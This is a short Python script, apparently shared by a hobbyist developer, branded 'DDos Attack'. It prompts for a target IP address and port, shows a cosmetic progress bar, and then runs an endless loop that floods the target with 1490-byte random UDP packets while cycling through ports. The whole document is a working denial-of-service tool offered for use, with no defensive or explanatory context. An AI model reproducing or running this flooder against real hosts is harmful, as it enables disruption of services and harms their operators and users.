import sys
import os
import time
import socket
import random
from datetime import datetime

# Obtener fecha y hora actual
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

################
print(f"Executed on: {day}/{month}/{year}")
time.sleep(3)
##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DDos Attack")
print("Dev: Tuhermanofeo")
print("GitHub: https://github.com/tuhermanofeo")
print("")

ip = input("IP Target : ")
port = int(input("Port       : "))  # <--- convertir a entero

os.system("clear") 
os.system("figlet Attack Starting")
print("[                    ] 0% ")
time.sleep(5)
print("[=====               ] 25%")
time.sleep(5)
print("[==========          ] 50%")
time.sleep(5)
print("[===============     ] 75%")
time.sleep(5)
print("[====================] 100%")
time.sleep(3)

sent = 0

while True:
    sock.sendto(bytes, (ip, port))
    sent += 1
    print("Sent %s packet to %s through port: %s" % (sent, ip, port))
    port += 1
    if port == 65534:
        port = 1
